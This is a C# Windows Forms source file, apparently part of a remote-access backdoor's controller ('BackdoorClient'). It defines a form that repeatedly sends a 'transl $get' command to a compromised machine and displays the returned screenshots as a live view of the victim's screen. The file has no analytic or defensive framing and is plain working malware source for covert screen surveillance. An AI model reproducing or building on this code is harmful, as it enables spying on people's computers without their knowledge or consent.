using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Xml;

namespace BackdoorClient
{
    public partial class ScreenViewStream : Form
    {
        public Form1 mainForm;
        public ScreenViewStream(Form1 f)
        {
            mainForm = f;
            InitializeComponent();
        }

        private void ScreenViewStream_Load(object sender, EventArgs e)
        {
            UpdateScreen();
        }

        private async void UpdateScreen()
        {
            await Task.Run(() => System.Threading.Thread.Sleep(1000));
            while (true)
            {
                var pictrBytes = new byte[100000];

                pictrBytes = mainForm.SendCommandAndGetBytesResponce("transl $get", 1000000);
                Bitmap bmp;
                try
                {
                    using (var ms = new MemoryStream(pictrBytes))
                    {
                        bmp = new Bitmap(ms);
                    }


                    translScreen.Image = bmp;
                }
                catch
                {

                }
                translScreen.Update();
                await Task.Run(() => System.Threading.Thread.Sleep(100));
            }
        }

        private void translScreen_Click(object sender, EventArgs e)
        {

        }
    }
}
